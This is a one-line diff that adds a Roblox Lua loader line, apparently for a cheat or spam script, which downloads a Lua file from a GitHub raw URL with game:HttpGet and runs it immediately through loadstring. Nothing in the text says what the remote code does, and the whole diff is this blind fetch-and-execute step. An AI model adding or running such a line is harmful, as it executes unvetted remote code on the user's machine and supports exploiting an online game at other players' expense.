@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Docktuangular/loaders/main/loaders/tha-bronx-3-spam0-pdt8ukatl1efbt.lua"))()
